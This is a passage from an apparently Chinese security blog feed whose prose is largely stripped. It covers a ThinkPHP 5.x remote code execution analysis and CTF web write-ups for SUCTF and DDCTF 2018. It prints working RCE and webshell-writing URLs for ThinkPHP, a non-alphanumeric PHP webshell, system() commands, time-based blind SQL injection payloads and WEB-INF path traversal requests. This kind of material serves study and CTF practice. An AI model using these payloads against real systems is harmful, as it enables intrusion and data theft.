class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>bindParamsgetpost<br>invokeFunction<code>$function</code><code>$vars</code><code>function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxx</code><br>poc<code>function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</code><br></p><ol><li>\think\app invokeFunction</li><li>function=call_user_func_arrayinvokeFunctioncall_user_func_array</li><li>call_user_func_arraysystemsystemls -l2</li></ol><p><img src="/attachments/93754c5f.png" alt="93754c5f.png"><br>\think\app<br><br><code>?s=/index/think\view\driver\php/display&amp;content=&lt;?php%20phpinfo();</code><br>index.php<br><code>?s=index/\think\template\driver\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code><br><br><code>?s=index/\think\config/get&amp;name=database.username</code></p><h2 id="thinkphp-v5-1-x"><a href="#thinkphp-v5-1-x" class="headerlink" title="thinkphp v5.1.x"></a>thinkphp v5.1.x</h2><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&lt;= v5.1.30<br><a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">  top-think/framework@802f284  GitHub</a><br>thinkphp/library/think/route/dispatch/Module.php</p><h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><p>v5.0.xs<br>App::run()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;dispatch;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            $dispatch = <span class="keyword">$this</span>-&gt;routeCheck()-&gt;init();<span class="comment">// modulecontrolleraction</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (HttpResponseException $exception) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">null</span>;</span><br><span class="line">        $data     = $exception-&gt;getResponse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;middleware-&gt;add(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($dispatch, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_null($data) ? $dispatch-&gt;run() : $data;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $response = <span class="keyword">$this</span>-&gt;middleware-&gt;dispatch(<span class="keyword">$this</span>-&gt;request);<span class="comment">// controlleraction</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>App::run()<br>13<br>thinkphp/library/think/App.php routeCheck()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    $path = <span class="keyword">$this</span>-&gt;request-&gt;path();</span><br><span class="line">    <span class="comment">// Request.php pathurlpath pathinfo()$_GET[$this-&gt;config['var_pathinfo']]</span></span><br><span class="line">    <span class="comment">// var_pathinfo s</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    $must = !is_null(<span class="keyword">$this</span>-&gt;routeMust) ? <span class="keyword">$this</span>-&gt;routeMust : <span class="keyword">$this</span>-&gt;route-&gt;config(<span class="string">'url_route_must'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  Dispatch</span></span><br><span class="line">    $dispatch = <span class="keyword">$this</span>-&gt;route-&gt;check($path, $must);<span class="comment">//UrlDispatchdispatch</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $dispatch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>7s(svar_pathinfo)routeCheckUrlDispatchUrlinit<br>thinkphp/library/think/route/dispatch/Url.php init<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// URL</span></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;parseUrl(<span class="keyword">$this</span>-&gt;dispatch);</span><br><span class="line">    <span class="comment">// parseUrl(/|//)[module,controller,action]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ModuleDispatchinitdispatchApp::run()dispatchrunv5.1v5.0<br>Dispatch::run()Module::exec()<br>thinkphp/library/think/route/dispatch/Module.php exec()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'module_init'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_controller_layer'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'controller_suffix'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'empty_controller'</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($instance)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            $call    = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">'_empty'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">'controller'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>execcontroller2055controlleractioninvokeReflectMethod<br>Request::filterValue<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// </span></span><br><span class="line">            $value = call_user_func($filter, $value);<span class="comment">//</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                <span class="comment">// </span></span><br><span class="line">                <span class="keyword">if</span> (!preg_match($filter, $value)) &#123;</span><br><span class="line">                    <span class="comment">// </span></span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>($filter)) &#123;</span><br><span class="line">                <span class="comment">// filter, filter_var</span></span><br><span class="line">                <span class="comment">// filter, filter_idid</span></span><br><span class="line">                $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">false</span> === $value) &#123;</span><br><span class="line">                    $value = $default;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>/controller<br>v5.0poc</p><p><br><code>?s=/index/think\view\driver\php/display&amp;content=&lt;?php%20phpinfo();</code><br>index.php<br><code>?s=index/\think\template\driver\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code><br><br><code>?s=index/\think\config/get&amp;name=database.username</code><br>\think\request/inputv5.0think\requestprotected<br><br><code>?s=index/\think\request/input&amp;data[]=123&amp;filter=phpinfo</code><br>invokeFunctionReflectionFunction<br><code>?s=index/\think\container/invokeFunction&amp;function=call_user_func&amp;vars[0]=phpinfo&amp;vars[1]=1</code><br><code>?s=index/\think\container/invokeFunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br>think\appthink\containerthink\app<br>call_user_func<br>call_user_func_array<br>v5.1php7v5.0assert</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><br>thinkphp v5v5.1thinkphp</p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSUCTF 2018 web writeup</title>
      <link href="2018/05/28/ctf/suctf-part-web-writeup/"/>
      <url>2018/05/28/ctf/suctf-part-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF"><a href="#SUCTF" class="headerlink" title="SUCTF"></a>SUCTF</h1><p>2SUCTFwebwriteup</p><a id="more"></a><h1 id="Anonymous"><a href="#Anonymous" class="headerlink" title="Anonymous"></a>Anonymous</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>phpcreate_function</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$MY = create_function(&quot;&quot;,&quot;some code&quot;); // catflag</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(32));</span><br><span class="line">eval(&quot;function &apos;SUCTF_&apos;.$hash()&#123;&quot;</span><br><span class="line">    .&quot;global \$MY;&quot;</span><br><span class="line">    .&quot;\$MY();&quot;</span><br><span class="line">    .&quot;&#125;&quot;);</span><br><span class="line">if(isset($_GET[&apos;func_name&apos;]))&#123;</span><br><span class="line">    $_GET[&quot;func_name&quot;]();</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>create_function<br>SUCTF_32 <code>$MY</code> <br><code>$MY</code>create_function<code>\0lambda_{number}</code>,number10002</p><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><ol><li>bp<code>$ () [] _ ~ . ; =</code></li><li>p<code>~({})</code>utf-82hex<br><a href="http://www.herongyang.com/gb2312_gb/pinyin_32.html" target="_blank" rel="noopener">http://www.herongyang.com/gb2312_gb/pinyin_32.html</a></li><li><p><code>assert</code><code>_GET</code><br><code>bin2hex(~(&#39;a&#39;))</code>utf-82getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=~();</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~();</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~();</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~();</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~();</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line">$_=~();</span><br><span class="line">$__.=$_[[]==[]];</span><br><span class="line"></span><br><span class="line">$_=~();</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~();</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~();</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$_=~();</span><br><span class="line">$___.=$_[[]==[]];</span><br><span class="line">$___=$$___;</span><br><span class="line">$__($___[_]);</span><br></pre></td></tr></table></figure></li><li><p>shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;ls /&apos;)</span><br><span class="line">system(&apos;cat /Th1s_14_f14g&apos;)</span><br></pre></td></tr></table></figure></li></ol><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>getshell</p><ol><li>eval</li><li>php</li><li>UTF-8 <a href="http://www.herongyang.com/gb2312_gb/pinyin_32.html" target="_blank" rel="noopener">http://www.herongyang.com/gb2312_gb/pinyin_32.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> suctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFDDCTF 2018 web writeup</title>
      <link href="2018/04/21/ctf/ddctf-2018-web-writeup/"/>
      <url>2018/04/21/ctf/ddctf-2018-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="DDCTF-2018-2WEB-Writeup"><a href="#DDCTF-2018-2WEB-Writeup" class="headerlink" title="DDCTF 2018 2WEB Writeup"></a>DDCTF 2018 2WEB Writeup</h1><a id="more"></a><h2 id="WEB00-"><a href="#WEB00-" class="headerlink" title="WEB00 "></a>WEB00 </h2><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>index.php IP:116.85.43.88http X-Forwarded-For: 116.85.43.88 </p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2:"></a>step 2:</h4><p>id,title,dateauthorpayload<code>a%&#39; &amp;&amp; &#39;%&#39;=&#39;%</code><code>a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%</code>,unionWAFpayload<code>a%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%</code>,5bool</p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3:"></a>step 3:</h4><p>authorsha1main.js<code>id=title=date=author=time=</code>sha1</p><h4 id="step-4"><a href="#step-4" class="headerlink" title="step 4:"></a>step 4:</h4><p>sha1payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">#  ddctf</span><br><span class="line">payload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">#  message, ctf_key4</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">#  ctf_key4:secvalue; message: id,title,author,time,status</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line"># flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125;</span><br></pre></td></tr></table></figure><h2 id="WEB01-"><a href="#WEB01-" class="headerlink" title="WEB01 "></a>WEB01 </h2><h4 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>IP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.102:5050/welcom/uuid # email:3814166715717836733@didichuxing.com</span><br><span class="line">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # .class,.ks,.ico,.xml</span><br><span class="line">http://116.85.48.102:5050/news/topFiveNews # </span><br><span class="line">http://116.85.48.102:5050//flag/testflag/yourflag #com.didichuxing.ctf.controller.user.FlagController.java</span><br></pre></td></tr></table></figure></p><h4 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2:"></a>step 2:</h4><p>githubspringmvc+mybatis<a href="https://github.com/liyifeng1994/ssm" target="_blank" rel="noopener"></a>,</p><ul><li>../../WEB-INF/web.xml # WEB-INF/applicationContext.xmlcom.didichuxing.ctf.listener.InitListener</li><li>../../WEB-INF/applicationContext.xml # classpath:mybatis/config.xml</li><li>../../WEB-INF/classes/mybatis/config.xml # mapper/FlagMapper.xml</li><li>../../WEB-INF/classes/mapper/FlagMapper.xml # sql</li><li>../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class</li><li>../../WEB-INF/classes/sdl.ks # </li><li>../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class</li></ul><h4 id="step-3-1"><a href="#step-3-1" class="headerlink" title="step 3:"></a>step 3:</h4><p>class<a href="http://www.javadecompilers.com/" target="_blank" rel="noopener"></a>javaflagController.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model)</span><br><span class="line">  &#123;</span><br><span class="line">    Flag flag = flagService.getFlagByEmail(email);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return &quot;Encrypted flag : &quot; + flag.getFlag();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>flaglistener.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;</span><br><span class="line">String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);</span><br><span class="line"></span><br><span class="line">byte[] data = cipher.doFinal(flag.getBytes());</span><br><span class="line">byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class="line"></span><br><span class="line">Flag flago = new Flag();</span><br><span class="line">flago.setId(Integer.valueOf(id));</span><br><span class="line">flago.setFlag(byte2hex(data));</span><br><span class="line">flago.setEmail(byte2hex(e));</span><br><span class="line">flago.setOriginFlag(flag);</span><br><span class="line">flago.setUuid(uuid);</span><br><span class="line">flago.setOriginEmail(email);</span><br></pre></td></tr></table></figure><p>Email168EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27<code>http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27</code>flag</p><h4 id="step-4-1"><a href="#step-4-1" class="headerlink" title="step 4:"></a>step 4:</h4><p>flag<a href="https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa" target="_blank" 